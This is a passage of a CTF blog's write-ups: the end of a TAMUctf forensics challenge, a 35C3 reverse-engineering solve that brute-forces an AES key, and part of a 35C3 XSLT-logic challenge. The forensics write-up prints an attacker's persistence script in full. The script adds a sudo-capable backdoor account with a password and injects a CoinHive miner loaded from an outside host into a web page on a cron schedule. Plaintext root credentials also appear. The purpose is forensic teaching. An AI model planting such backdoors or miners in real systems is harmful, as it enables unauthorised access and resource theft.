28Kdrwxr-xr-x 6 root root 4.0K May 22 2018 ../drwxr-xr-x 3 1001 pcap 4.0K May 22 2018 ./-rwxrwxr-x 1 evilgod evilgod 695 May 22 2018 setup.sh*drwx------ 2 1001 pcap 4.0K May 22 2018 .ssh/-rw-r--r-- 1 1001 pcap 655 May 16 2017 .profile-rw-r--r-- 1 1001 pcap 220 Sep 1 2015 .bash_logout-rw-r--r-- 1 1001 pcap 3.7K Sep 1 2015 .bashrc Any user could read this file so after checking the content of it:1234567891011121314151617181920$ cat home/ubuntu/setup.sh #!/bin/bashexport DEBIAN_FRONTEND=\"noninteractive\"sudo apt-get -y update &amp;&amp; apt-get install -y apache2 apache2-doc apache2-utils mysql-server php libapache2-mod-php php-mcrypt php-mysql pythonsudo sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/g' /etc/ssh/sshd_configsudo sed -i 's/StrictModes yes/#StrictModes yes/g' /etc/ssh/sshd_configsudo service ssh restartsudo echo \"root:0A0YlBjrlBXSr14MPz\" | chpasswdexport APACHE_RUN_USER=www-dataexport APACHE_RUN_GROUP=www-dataexport APACHE_PID_FILE=/var/run/apache2.pidexport APACHE_RUN_DIR=/var/run/apache2export APACHE_LOCK_DIR=/var/lock/apache2export APACHE_LOG_DIR=/var/log/apache2sudo service apache2 restart; The root password was there so this is how the attacker got privilege escalation, the answer to this question was: 12$ md5sum home/ubuntu/setup.sh93b74abb459cdd93bd254302fba4dfdf home/ubuntu/setup.sh What account were the attackers able to escalate to?The answer is pretty simple the account was root. What is the password for that account?The password is what we found on the file before which is 0A0YlBjrlBXSr14MPz 5_persistenceThanks for finding that information out.We have since changed the password for that account.Looks like we might have to spend a few days putting our employees through some security training.Unfortunately since deleting the malicous links off of our home page they have reappeared again.Can you figure out how the attacker was able to re infect our home page?1. What is the md5sum of the file the attacker is using for persistence?2. What account was created?3. What group did the attacker add the account to?4. What time of day does the attacker reinfect the machine? (use 24 hr notation ex: 0100 for 1 am) What is the md5sum of the file the attacker is using for persistence?Remember the file we found on 1_logs ? that’s what he was using for persistence, this file is located in the root directory: 12$ md5sum root/backup.sh29ff58b6607c824451349183a570cc6c root/backup.sh The answer was 29ff58b6607c824451349183a570cc6c What account was created?We could easily see this by just looking at the backup.sh: 1234567891011121314#!/bin/bashif ! id -u devtest2; then mkdir /home/devtest2 useradd --home=/home/devtest2 -s /bin/bash devtest2 echo \"devtest2:HYf6lEMhUM4Z0b079X\" | chpasswd chown devtest2:devtest2 /home/devtest2 echo 'devtest2 ALL=(ALL:ALL) ALL' &gt;&gt; /etc/sudoersfisudo cat /var/www/html/index.html | grep \"miner.js\"if [ $? != 0 ]; then sed -i 's/&lt;\\/body&gt;/&lt;script src = http:\\/\\/10.187.195.95\\/js\\/colorbox.min.js&gt;&lt;\\/script&gt;&lt;script&gt;var color = new CoinHive.Anonymous(\"123456-asdfgh\");color.start()&lt;\\/script&gt;&lt;\\/body&gt;/g' /var/www/html/index.htmlfi The user created was devtest2, alternatively we could also look at auth.log file and see: 12345678910$ sudo cat var/log/auth.log... [truncated]May 22 19:11:40 ubuntu-xenial useradd[12186]: new group: name=devtest2, GID=1003May 22 19:11:40 ubuntu-xenial useradd[12186]: new user: name=devtest2, UID=1003, GID=1003, home=/home/devtest2, shell=/bin/bashMay 22 19:11:40 ubuntu-xenial chpasswd[12192]: pam_unix(chpasswd:chauthtok): password changed for devtest2May 22 19:11:40 ubuntu-xenial sudo: root : TTY=unknown ; PWD=/root ; USER=root ; COMMAND=/bin/cat /var/www/html/index.htmlMay 22 19:11:40 ubuntu-xenial sudo: pam_unix(sudo:session): session opened for user root by (uid=0)May 22 19:11:40 ubuntu-xenial sudo: pam_unix(sudo:session): session closed for user rootMay 22 19:11:40 ubuntu-xenial sshd[12140]: pam_unix(sshd:session): session closed for user rootMay 22 19:11:40 ubuntu-xenial systemd-logind[1046]: Removed session 4. So the answer was devtest2 What group did the attacker add the account to?We can get this answer from the backup.sh file from the line: 1echo 'devtest2 ALL=(ALL:ALL) ALL' &gt;&gt; /etc/sudoers The group he added was sudoers group, so the answer was sudoers. What time of day does the attacker reinfect the machine? (use 24 hr notation ex: 0100 for 1 am)So the attacker is using something to automate the script every day, so the first thing that came to my mind was crontab so I just checked the scripts running on crontab from the root user you can find it on the directory var/spool/cron/crontabs/: 12$ ls var/spool/cron/crontabs/root Now seeing the file:12345$ cat var/spool/cron/crontabs/root# DO NOT EDIT THIS FILE - edit the master and reinstall.# (- installed on Tue May 22 19:11:40 2018)# (Cron version -- $Id: crontab.c,v 2.13 1994/01/17 03:20:37 vixie Exp $)30 2 * * 0 root /root/backup.sh &gt; /dev/null 2&gt;&amp;1 Then I used this website to translate those crontab numbers because I was way too lazy to check out how it works (copied the beginning string of 30 2 0): Translation to the 24h notation the answer is 0230.","categories":[{"name":"Forensics","slug":"Forensics","permalink":"https://teamrocketist.github.io/categories/Forensics/"}],"tags":[{"name":"forensics","slug":"forensics","permalink":"https://teamrocketist.github.io/tags/forensics/"},{"name":"TAMUctf","slug":"TAMUctf","permalink":"https://teamrocketist.github.io/tags/TAMUctf/"}]},{"title":"[Reverse] 35C3 - corebot","slug":"Reverse-35C3-corebot","date":"2018-12-30T10:36:09.000Z","updated":"2018-12-30T11:55:41.538Z","comments":true,"path":"2018/12/30/Reverse-35C3-corebot/","link":"","permalink":"https://teamrocketist.github.io/2018/12/30/Reverse-35C3-corebot/","excerpt":"","text":"Solves: 97 https://35c3ctf.ccc.ac/uploads/corebot-640d3c582340e647d72e1dd9418a3fd6 Difficulty estimate: easy Guest challenge by Jesko / rattle. UPDATE: Challenge binary replaced. Apologies for the inconvenience. Solution Identify which encryption algorithm is being used. Extract the encrypted data from PE resources. Brute-force the last bytes of the serial volume key. Generate the key with the serial. Decrypt the data and obtain the flag. WalkthroughSo we got a windows binary that uses CryptoAPI from Microsoft first thing to do is to open the binary in IDA a check the start function:So after creating the key for AES the program will import the key handle following by decrypting the loaded encrypted data from the PE resources as it is explained in the image bellow:As I explained in the image above if you inspect the sub_11B1146 you will see it’s using the LoadResources function to extract data from the PE executable, this data happens to be the encrypted data. We can extract this data in two ways, either with dynamic analysis or with a tool to extract resources from windows binaries in my case i used wrestool: 123$ wrestool --raw -x corebot-640d3c582340e647d72e1dd9418a3fd6 | xxd00000000: 1029 b845 9d2a ab93 fe89 fb82 9342 a18c .).E.*.......B..00000010: 2e90 6300 0611 8064 b821 c29f 35e7 7ef2 ..c....d.!..5.~. Now that we got the encrypted data we need to find a way to decrypt the data, since the key was created with challenge creator volume serial we need to brute force it, since it’s only using the lower bytes of the serial we only need to brute force two bytes. Time to write a script to bruteforce the serial and decrypt: 12345678910111213141516171819202122232425262728import base64import hashlibimport sysfrom Crypto import Randomfrom Crypto.Cipher import AESdef decrypt_ecb_cipher(ciphertext, key): cipher = AES.new(key, AES.MODE_ECB) plaintext = cipher.decrypt(ciphertext) return plaintextfor i in xrange(0xffff+1): v5 = 0x10 v4 = i key = '' while True: key = chr(((v4 &amp; 0xffff) &amp; 0xff)) + chr(((v4 &amp; 0xffff) &amp; 0xff00) &gt;&gt; 8) + key; v4 ^= ((v4 &amp; 0xffff) &gt;&gt; 4) ^ ((v4 &amp; 0xffff) &lt;&lt; 11) ^ ((v4 &amp; 0xffff) &lt;&lt; 7) v5 -= 1 if v5 == 0: break ciphertext = \"\\x10\\x29\\xb8\\x45\\x9d\\x2a\\xab\\x93\\xfe\\x89\\xfb\\x82\\x93\\x42\\xa1\\x8c\\x2e\\x90\\x63\\x00\\x06\\x11\\x80\\x64\\xb8\\x21\\xc2\\x9f\\x35\\xe7\\x7e\\xf2\" message = decrypt_ecb_cipher(ciphertext, key) if message[:4] == '35C3': sys.stdout.write(message) print hex(i) break Now running the script: 123$ python corebot.py35C3_MalwareAuthorKryptoChef0x25c3 The lower bytes of the serial is 0x25c3 and the respective flag was 35C3_MalwareAuthorKryptoChef.","categories":[{"name":"Reverse","slug":"Reverse","permalink":"https://teamrocketist.github.io/categories/Reverse/"}],"tags":[{"name":"reverse","slug":"reverse","permalink":"https://teamrocketist.github.io/tags/reverse/"},{"name":"cryptoApi","slug":"cryptoApi","permalink":"https://teamrocketist.github.io/tags/cryptoApi/"},{"name":"35C3","slug":"35C3","permalink":"https://teamrocketist.github.io/tags/35C3/"},{"name":"windowsBinary","slug":"windowsBinary","permalink":"https://teamrocketist.github.io/tags/windowsBinary/"},{"name":"exeResources","slug":"exeResources","permalink":"https://teamrocketist.github.io/tags/exeResources/"}]},{"title":"[Reverse] 35C3 - juggle","slug":"Reverse-35C3-juggle","date":"2018-12-30T01:03:08.000Z","updated":"2018-12-31T08:25:29.507Z","comments":true,"path":"2018/12/30/Reverse-35C3-juggle/","link":"","permalink":"https://teamrocketist.github.io/2018/12/30/Reverse-35C3-juggle/","excerpt":"","text":"juggle 97 Solves: 54 Can you help this restaurant Stack the right amount of Eggs in their ML algorithms? Guest challenge by Tethys. Note that you need to send a shutdown(2) after you sent your solution. The nmap netcat will do so for you, e.g.: ncat 35.246.237.11 1 &lt; solution.xml /usr/bin/ncat –help | grep -n 1 Ncat 7.60 ( https://nmap.org/ncat ) Files here: https://35c3ctf.ccc.ac/uploads/juggle-f6b6fa299ba94bbbbce2058a5ca698db.tar XSL service is running in the server at a certain port, a dockerfile was provided which was cool, it helped me a lot in the debugging process, in the container environment I had no previous knowledge of xslt which took me more time in this challenge than it should. Solution The seed is not set in random so we can abuse it by doing very quick requests to get the same numbers Identify which plate prints the flag Use the plates in a certain order to achieve the condition necessary to print the flag Walk-throughSo I started by analysing the docker file, the container is using nsjail to isolate the /usr/bin/xalan service as we can see bellow: Setting up the Docker container12345FROM tsuro/nsjailRUN apt-get install -y xalanCOPY challenge.min.xslt /home/user/#COPY tmpflag /flagCMD /bin/sh -c \"/usr/bin/setup_cgroups.sh &amp;&amp; su user -c '/usr/bin/nsjail -Ml --port 1337 --chroot / --user 1000 --group 1000 --cgroup_mem_max 209715200 --cgroup_pids_max 100 --cgroup_cpu_ms_per_sec 100 --rlimit_as max --rlimit_cpu max --rlimit_nofile max --rlimit_nproc max -- /usr/bin/stdbuf -i0 -o0 -e0 /usr/bin/maybe_pow.sh /usr/bin/xalan -xsl /home/user/challenge.min.xslt'\" Eventually I had to fix a line in the docker file at:1COPY challenge/challenge.min.xslt /home/user/ The challenge.min.xslt was located in the root directory after extracting the files, so I ended up changing this into: 1COPY challenge.min.xslt /home/user/ So lets start to build the image with docker build: 1$ sudo docker build -t juggle . After this you can list the image created: 123456789101112131415161718192021$ sudo docker image lsREPOSITORY TAG IMAGE ID CREATED SIZEpermute latest 1603e833509a 23 hours ago 147MBjuggle latest b4c26a022c1e 33 hours ago 205MBtsuro/nsjail latest 8774d7aad732 2 days ago 156MBadalovelace/nodejs latest c2a6e42b25c8 2 days ago 63.7MBnode 6-alpine c45d42c157e3 2 days ago 55.6MBnginx latest 02256cfb0e4b 2 days ago 109MBalpine latest 3f53bb00af94 8 days ago 4.41MBcentos 7 1e1148e4cc2c 3 weeks ago 202MBpostgres latest f9b577fb1ed6 4 weeks ago 311MBthecolonial/police-quest 1.0 0ea244849eb0 4 weeks ago 345MBubuntu 14.04 f17b6a61de28 5 weeks ago 188MBmysql latest f991c20cb508 6 weeks ago 486MBhttpd latest 2a51bb06dc8b 6 weeks ago 132MBdebian latest 4879790bd60d 6 weeks ago 101MBseccon_pwn latest 3749dfe7031c 7 weeks ago 2.06GBskysider/pwndocker latest a24dde07a423 7 weeks ago 2.02GBelasticsearch 2 5e9d896dc62c 3 months ago 479MBpostgres 9.6.2 b3b8a2229953 19 months ago 267MBpostgres 9.6.1 4023a747a01a 23 months ago 265MB As we can see in the list the juggle image was created (the name we gave it). With this we can start running the container by just using docker container run:1$ sudo docker run -it -p 1337:1337 --name 35c3_juggle juggle bash After this a bash console will pop-up in the container unfortunately the command in the end of the docker didn’t work maybe something related with nsjail, I don’t know maybe I did something wrong when I was trying to connect to the service, I even tryed to rerun the command inside the container but it always gave me an error, so to not loose much time identifying it I setted up very quiclky a service with socat, socat isn’t installed in this container so I needed to install it via apt-get: 1root@b0927d9b031a $ socat tcp-listen:1337,fork,reuseaddr EXEC:/usr/bin/xalan -xsl /home/user/challenge.min.xslt' Since I forwarded the port 1337 from the host to the container port 1337 with the parameter -p in the docker run command. Now I could connect from the host directly to the localhost with ncat localhost 1337 without getting any errors from the server. XML format analysisSo it’s time to start analysing the challenge.min.xslt file, this file was minimized so I searched for an online tool to beautify to make it more readable, so lets start with the beginning: 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:math=\"http://exslt.org/math\" xmlns:exsl=\"http://exslt.org/common\" exclude-result-prefixes=\"xsl math exsl\"&gt; &lt;xsl:template match=\"/meal\"&gt; &lt;all&gt; &lt;xsl:if test=\"count(//plate) &gt; 300\"&gt; &lt;xsl:message terminate=\"yes\"&gt;You do not have enough money to buy that much food&lt;/xsl:message&gt; &lt;/xsl:if&gt; &lt;xsl:variable name=\"chef-drinks\"&gt; &lt;value&gt; &lt;xsl:value-of select=\"round(math:random() * 4294967296)\"/&gt; &lt;/value&gt; &lt;value&gt; &lt;xsl:value-of select=\"round(math:random() * 4294967296)\"/&gt; &lt;/value&gt; &lt;value&gt; &lt;xsl:value-of select=\"round(math:random() * 4294967296)\"/&gt; &lt;/value&gt; &lt;value&gt; &lt;xsl:value-of select=\"round(math:random() * 4294967296)\"/&gt; &lt;/value&gt; &lt;value&gt; &lt;xsl:value-of select=\"round(math:random() * 4294967296)\"/&gt; &lt;/value&gt; &lt;/xsl:variable&gt; &lt;xsl:call-template name=\"consume-meal\"&gt; &lt;xsl:with-param name=\"chef-drinks\" select=\"exsl:node-set($chef-drinks)//value\"/&gt; &lt;xsl:with-param name=\"food-eaten\" select=\"1\"/&gt; &lt;xsl:with-param name=\"course\" select=\"course[position() = 1]/plate\"/&gt; &lt;xsl:with-param name=\"drinks\" select=\"state/drinks\"/&gt; &lt;/xsl:call-template&gt; &lt;/all&gt; &lt;/xsl:template&gt; &lt;xsl:template name=\"consume-meal\"&gt; &lt;xsl:param name=\"chef-drinks\"/&gt; &lt;xsl:param name=\"food-eaten\"/&gt; &lt;xsl:param name=\"course\"/&gt; &lt;xsl:param name=\"drinks\"/&gt;... So if you don’t know about xslt is a language that parses a xml document, and with that you can do things like converting that xml into html in a very easy way. Right at the beginning we can see what kind of structure of xml they want : 1&lt;xsl:template match=\"/meal\"&gt; The match parameter will look in the xml document from the root for a tag , from this you can look up into the elements inside of it. Now right after setting this an variable is declared with some random numbers (drinks), variables like in any other language are used to store values to be used later, in xslt is no different. 12345678910111213141516171819&lt;xsl:variable name=\"chef-drinks\"&gt;&lt;value&gt;&lt;xsl:variable name=\"chef-drinks\"&gt; &lt;value&gt; &lt;xsl:value-of select=\"round(math:random() * 4294967296)\"/&gt; &lt;/value&gt; &lt;value&gt; &lt;xsl:value-of select=\"round(math:random() * 4294967296)\"/&gt; &lt;/value&gt; &lt;value&gt; &lt;xsl:value-of select=\"round(math:random() * 4294967296)\"/&gt; &lt;/value&gt; &lt;value&gt; &lt;xsl:value-of select=\"round(math:random() * 4294967296)\"/&gt; &lt;/value&gt; &lt;value&gt; &lt;xsl:value-of select=\"round(math:random() * 4294967296)\"/&gt; &lt;/value&gt;&lt;/xsl:variable&gt; This random implementation looks already suspicious, looks it it doesn’t even have any kind of seed, and if it has a seed it probably is the current time. Now right after declaring this drinks with random numbers it does a template call as you can see bellow: 123456&lt;xsl:call-template name=\"consume-meal\"&gt; &lt;xsl:with-param name=\"chef-drinks\" select=\"exsl:node-set($chef-drinks)//value\"/&gt; &lt;xsl:with-param name=\"food-eaten\" select=\"1\"/&gt; &lt;xsl:with-param name=\"course\" select=\"course[position() = 1]/plate\"/&gt; &lt;xsl:with-param name=\"drinks\" select=\"state/drinks\"/&gt;&lt;/xsl:call-template&gt; You can think of this like it’s a function call in a normal language, the name of the function is consume-meal and its arguments are right below, the declaration of consume-meal is just below this code, but before doing that lets analyse the selects for the arguments since they give us hints about how the xml document should be built. So for the first parameter: 1&lt;xsl:with-param name=\"chef-drinks\" select=\"exsl:node-set($chef-drinks)//value\"/&gt; so exsl:node-set will just grab all the values from the variable $chef-drinks and pass it into the function as it was an array, explaining the //value part, the first / is referencing the the tag of the variable &lt;xsl:variable name=”chef-drinks”&gt; and the /value is referencing to the \\&lt;value> tag, this extracts the variable random number drinks and sets them as an array to be used in the template “function”. So for the second parameter: 1&lt;xsl:with-param name=\"food-eaten\" select=\"1\"/&gt; The food-eaten parameter is initialized into 1 and this an integer variable that ill keep track of the number of plates you consume, after analysing consume-meal you will see that there’s a limit of plates you can eat that’s why they are tracking this number here. So for the third parameter: 1&lt;xsl:with-param name=\"course\" select=\"course[position() = 1]/plate\"/&gt; Since we are inside a template tag match meal, by analysing this select it looks it inside the tag meal, our xml will need to have a course tag (\\&lt;course>) and plate tags inside of it, this works like a hierarchy from the left to right, the part [position() = 1] is just selecting the first plate inside the course tag, an example xml could be like this: 1234567891011&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;meal&gt; &lt;course&gt; &lt;plate&gt; 1st plate &lt;/plate&gt; &lt;plate&gt; 2nd plate &lt;/plate&gt; &lt;/course&gt;&lt;/meal&gt; So course[position() = 1] will select the first plate inside course so the parameter course will be set into : 123&lt;plate&gt; 1st plate&lt;/plate&gt; So for the fourth parameter: 1&lt;xsl:with-param name=\"drinks\" select=\"state/drinks\"/&gt; Once again this will select all the drinks declared inside state and drinks tags, so two new tags will needed to be added inside meal tag. Based on the information we have now an example xml can be build like this:1234567891011121314&lt;meal&gt; &lt;course&gt; &lt;plate&gt; 1st plate &lt;/plate&gt; &lt;plate&gt; 2nd plate &lt;/plate&gt; &lt;/course&gt; &lt;state&gt; &lt;drinks&gt;1&lt;/drinks&gt; &lt;drinks&gt;2&lt;/drinks&gt; &lt;/state&gt;&lt;/meal&gt; And now finally analysing the “function” consume-meal: 1234567891011&lt;xsl:template name=\"consume-meal\"&gt; &lt;xsl:param name=\"chef-drinks\"/&gt; &lt;xsl:param name=\"food-eaten\"/&gt; &lt;xsl:param name=\"course\"/&gt; &lt;xsl:param name=\"drinks\"/&gt; &lt;xsl:if test=\"$food-eaten &gt; 30000\"&gt; &lt;xsl:message terminate=\"yes\"&gt;You ate too much and died&lt;/xsl:message&gt; &lt;/xsl:if&gt; &lt;xsl:if test=\"count($drinks) &gt; 200\"&gt; &lt;xsl:message terminate=\"yes\"&gt;You cannot drink that much&lt;/xsl:message&gt; &lt;/xsl:if&gt; Right at the beginning the parameters of the “function” are being declared, and two ifs are checking if we ate more than 30k plates or more than 200 drinks, so if we eat of drink more than that , the function terminates and “prints” a message to the user. After this we come up with a new if, it checks if the number of plates is higher than 0, and a new tag xsl:choose, which is like a switch-case from the c language the when tags are the case clauses, and it only enters it if the condition is true of course. Right before the choose two variables are being initialized, c and r , the variable c will get the head (first element) of the plate list inside the tag course, and r will be setted into the rest plates of the list, position()&gt;1 will select all the plates above the position 1. 12345678910111213141516171819202122232425262728293031323334353637&lt;xsl:if test=\"count($course) &gt; 0\"&gt; &lt;xsl:variable name=\"c\" select=\"$course[1]\" /&gt; &lt;xsl:variable name=\"r\" select=\"$course[position()&gt;1]\" /&gt; &lt;xsl:choose&gt; &lt;xsl:when test=\"count($c/宫保鸡丁) = 1\"&gt; &lt;xsl:message&gt; &lt;chef-drinks&gt; &lt;xsl:copy-of select=\"$chef-drinks\"/&gt; &lt;/chef-drinks&gt; &lt;/xsl:message&gt; &lt;xsl:message&gt; &lt;drinks&gt; &lt;xsl:copy-of select=\"$drinks\"/&gt; &lt;/drinks&gt; &lt;/xsl:message&gt; &lt;xsl:call-template name=\"consume-meal\"&gt; &lt;xsl:with-param name=\"chef-drinks\" select=\"$chef-drinks\"/&gt; &lt;xsl:with-param name=\"food-eaten\" select=\"$food-eaten + 1\"/&gt; &lt;xsl:with-param name=\"course\" select=\"$r\"/&gt; &lt;xsl:with-param name=\"drinks\" select=\"$drinks\"/&gt; &lt;/xsl:call-template&gt; &lt;/xsl:when&gt; &lt;xsl:when test=\"count($c/paella) = 1\"&gt; &lt;xsl:variable name=\"newdrinks\"&gt; &lt;value&gt; &lt;xsl:value-of select=\"$c/paella + 0\"/&gt; &lt;/value&gt; &lt;xsl:copy-of select=\"$drinks\"/&gt; &lt;/xsl:variable&gt; &lt;xsl:call-template name=\"consume-meal\"&gt; &lt;xsl:with-param name=\"chef-drinks\" select=\"$chef-drinks\"/&gt; &lt;xsl:with-param name=\"food-eaten\" select=\"$food-eaten + 1\"/&gt; &lt;xsl:with-param name=\"course\" select=\"$r\"/&gt; &lt;xsl:with-param name=\"drinks\" select=\"exsl:node-set($newdrinks)//value\"/&gt; &lt;/xsl:call-template&gt; &lt;/xsl:when&gt;... Clause AnalysisI will only explain 3 clauses, since my solution only uses 3 it makes sense to only explain these ones. Analysing the first case-clause: 1&lt;xsl:when test=\"count($c/宫保鸡丁) = 1\"&gt; We can already update out XML into this, since $c is a plate we will need a new tag which are named into this weird names, if we want to enter into this clause: 123456789101112131415161718&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;meal&gt; &lt;course&gt; &lt;plate&gt; &lt;宫保鸡丁&gt;4&lt;/宫保鸡丁&gt; &lt;/plate&gt; &lt;/course&gt; &lt;state&gt; &lt;drinks&gt; 1 &lt;/drinks&gt; &lt;drinks&gt; 1 &lt;/drinks&gt; &lt;/state&gt;&lt;/meal&gt; Now analysing the code when we enter this clause 宫保鸡丁 , as we can see below it only prints the current chef drinks and the current drinks, in the end is recalling consume-meal, this will form a recursive function that will iterate all the plates created in the course tag, as we can see the parameters passed the only thing that changes is the $course the $r is passed into this parameter so we don’t get stuck in a infinite loop which is the usually the thing you do when creating a recursive function, oh the other change is obvious the incrementing of the variable food-eaten. 123456789101112131415161718&lt;xsl:when test=\"count($c/宫保鸡丁) = 1\"&gt; &lt;xsl:message&gt; &lt;chef-drinks&gt; &lt;xsl:copy-of select=\"$chef-drinks\"/&gt; &lt;/chef-drinks&gt; &lt;/xsl:message&gt; &lt;xsl:message&gt; &lt;drinks&gt; &lt;xsl:copy-of select=\"$drinks\"/&gt; &lt;/drinks&gt; &lt;/xsl:message&gt; &lt;xsl:call-template name=\"consume-meal\"&gt; &lt;xsl:with-param name=\"chef-drinks\" select=\"$chef-drinks\"/&gt; &lt;xsl:with-param name=\"food-eaten\" select=\"$food-eaten + 1\"/&gt; &lt;xsl:with-param name=\"course\" select=\"$r\"/&gt; &lt;xsl:with-param name=\"drinks\" select=\"$drinks\"/&gt; &lt;/xsl:call-template&gt;&lt;/xsl:when&gt; Analysing the second case-clause: 1234567891011&lt;xsl:when test=\"count($c/दाल) = 1\"&gt; &lt;xsl:if test=\"count($chef-drinks) = 0\"&gt; &lt;xsl:copy-of select=\"document('/flag')\"/&gt; &lt;/xsl:if&gt; &lt;xsl:call-template name=\"consume-meal\"&gt; &lt;xsl:with-param name=\"chef-drinks\" select=\"$chef-drinks\"/&gt; &lt;xsl:with-param name=\"food-eaten\" select=\"$food-eaten + 1\"/&gt; &lt;xsl:with-param name=\"course\" select=\"$r\"/&gt; &lt;xsl:with-param name=\"drinks\" select=\"$drinks\"/&gt; &lt;/xsl:call-template&gt;&lt;/xsl:when&gt; Now analysing the code when we enter this clause दाल, we can see it will print and select a document “/flag” which will contain the flag we need, perhaps we need satisfy the condition count($chef-drinks) = 0, the chef-drinks is initialized with 5 random numbers (chef-drinks) so we need to find a clause that removes items from $chef-drinks so we reach the count of 0. Analysing the third case-clause: 12345678910111213&lt;xsl:when test=\"count($c/Борщ) = 1\"&gt; &lt;xsl:variable name=\"arg0\"&gt; &lt;value&gt; &lt;xsl:value-of select=\"$drinks[1] + 0\"/&gt; &lt;/value&gt; &lt;/xsl:variable&gt; &lt;xsl:call-template name=\"consume-meal\"&gt; &lt;xsl:with-param name=\"chef-drinks\" select=\"$chef-drinks[position() &gt; 1 or $chef-drinks[1] != $arg0]\"/&gt; &lt;xsl:with-param name=\"food-eaten\" select=\"$food-eaten + 1\"/&gt; &lt;xsl:with-param name=\"course\" select=\"$r\"/&gt; &lt;xsl:with-param name=\"drinks\" select=\"$drinks[position() &gt; 1]\"/&gt; &lt;/xsl:call-template&gt;&lt;/xsl:when&gt; Now analysing the code when we enter this clause Борщ, the first drink in $drinks (drinks declared inside the state tag) is setted into arg0 variable, now analysing the recalling parameters we can see chef-drinks is being modified: 1&lt;xsl:with-param name=\"chef-drinks\" select=\"$chef-drinks[position() &gt; 1 or $chef-drinks[1] != $arg0]\"/&gt; The select will remove the head of $chef-drinks based on a condition position() &gt; 1 or $chef-drinks[1] != $arg0, so to make this condition work we need either for both condition to be both false, or to at least position() &gt; 1 to be true, unfortunately position() &gt; 1 will never be true in this situation because position() will return the current position order in xml and since it’s not associated into any tag it will always return 1 because is associated to the root element meal, 1 &gt; 1 is always false so we need to make $chef-drinks[1] != $arg0 to return false as well, the $chef-drinks are declared as random in the begining but as I said before the randomness is implemented in a wrong way, if we do fast requests we can get the same numbers as we can analyse it here: 123456789101112131415$ ncat 35.246.237.11 1 &lt; solution.xmlReading input document from stdin...XSLT message: 2790719341256416733922614505473645015994193916258 (Occurred in entity 'file:///home/user/challenge.min.xslt', at line 1, column 1.)Source tree node: meal.XSLT message: (Occurred in entity 'file:///home/user/challenge.min.xslt', at line 1, column 1.)Source tree node: meal.&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;all/&gt;⏎ $ ncat 35.246.237.11 1 &lt; solution.xmlReading input document from stdin...XSLT message: 2790719341256416733922614505473645015994193916258 (Occurred in entity 'file:///home/user/challenge.min.xslt', at line 1, column 1.)Source tree node: meal.XSLT message: (Occurred in entity 'file:///home/user/challenge.min.xslt', at line 1, column 1.)Source tree node: meal.&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;all/&gt; The only case-clause that prints the $chef-drinks for us is 宫保鸡丁 , so the xml used to print the samples above was: 123456789101112&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;meal&gt; &lt;course&gt; &lt;plate&gt; &lt;宫保鸡丁&gt;4&lt;/宫保鸡丁&gt; &lt;/plate&gt; &lt;/course&gt; &lt;state&gt; &lt;/state&gt;&lt;/meal&gt; But we ran into a problem here right? as you can see it prints chef-drinks into a single number, 2790719341256416733922614505473645015994193916258, it looks like the message printing is joining all the 5 elements into a one number, for example if the random numbers were 1,2,3,4,5 the number that would be printed is 12345 , the problem is sometimes each drink will have a different length and we don’t have any way to tell which length each element has, so I decided to analyse a lot of occurrences. To make sure the length of each $chef-drink I decided to modify a little bit the challenge.min.xslt file in my docker container so I could print those numbers as well, so right after the declared parameters in consume-meal I added this line: 1&lt;xsl:copy-of select=\"$chef-drinks\" /&gt; So at every iteration of consumer-meals the $chef-drinks will be printed like this: 1234567$ ncat localhost 1337 &lt; solution.xmlReading input document from stdin...XSLT message: 993763458325537011481963110810288894381216985659 (Occurred in entity 'file:///home/user/challenge.min.xslt', at line 65, column 65.)Source tree node: meal.XSLT message: (Occurred in entity 'file:///home/user/challenge.min.xslt', at line 70, column 70.)Source tree node: meal.&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;all&gt;&lt;value&gt;993763458&lt;/value&gt;&lt;value&gt;3255370114&lt;/value&gt;&lt;value&gt;819631108&lt;/value&gt;&lt;value&gt;1028889438&lt;/value&gt;&lt;value&gt;1216985659&lt;/value&gt;&lt;value&gt;993763458&lt;/value&gt;&lt;value&gt;3255370114&lt;/value&gt;&lt;value&gt;819631108&lt;/value&gt;&lt;value&gt;1028889438&lt;/value&gt;&lt;value&gt;1216985659&lt;/value&gt;&lt;/all&gt; So after this I did this bash script:123456##35.246.237.11 1for i in &#123;1..1000&#125;dovar1=$(ncat localhost 1337 &lt; solution.xml | grep -Poh '\\d&#123;4,&#125;')echo $var1;done Running it into a file: 1$ bash rofl.sh &gt; out So after saving the outputs into a file I got something like this: 12345678910111213141516171819202122232425262728293031323334353637383940411326253109254338424518246198631339281333178972257 1326253109 2543384245 182461986 3133928133 3178972257 1326253109 2543384245 182461986 3133928133 31789722571326253109254338424518246198631339281333178972257 1326253109 2543384245 182461986 3133928133 3178972257 1326253109 2543384245 182461986 3133928133 31789722571326253109254338424518246198631339281333178972257 1326253109 2543384245 182461986 3133928133 3178972257 1326253109 2543384245 182461986 3133928133 31789722571326253109254338424518246198631339281333178972257 1326253109 2543384245 182461986 3133928133 3178972257 1326253109 2543384245 182461986 3133928133 31789722571326253109254338424518246198631339281333178972257 1326253109 2543384245 182461986 3133928133 3178972257 1326253109 2543384245 182461986 3133928133 31789722571326253109254338424518246198631339281333178972257 1326253109 2543384245 182461986 3133928133 3178972257 1326253109 2543384245 182461986 3133928133 31789722571326253109254338424518246198631339281333178972257 1326253109 2543384245 182461986 3133928133 3178972257 1326253109 2543384245 182461986 3133928133 31789722571326253109254338424518246198631339281333178972257 1326253109 2543384245 182461986 3133928133 3178972257 1326253109 2543384245 182461986 3133928133 31789722571326253109254338424518246198631339281333178972257 1326253109 2543384245 182461986 3133928133 3178972257 1326253109 2543384245 182461986 3133928133 31789722571326253109254338424518246198631339281333178972257 1326253109 2543384245 182461986 3133928133 3178972257 1326253109 2543384245 182461986 3133928133 31789722571326253109254338424518246198631339281333178972257 1326253109 2543384245 182461986 3133928133 3178972257 1326253109 2543384245 182461986 3133928133 31789722571326253109254338424518246198631339281333178972257 1326253109 2543384245 182461986 3133928133 3178972257 1326253109 2543384245 182461986 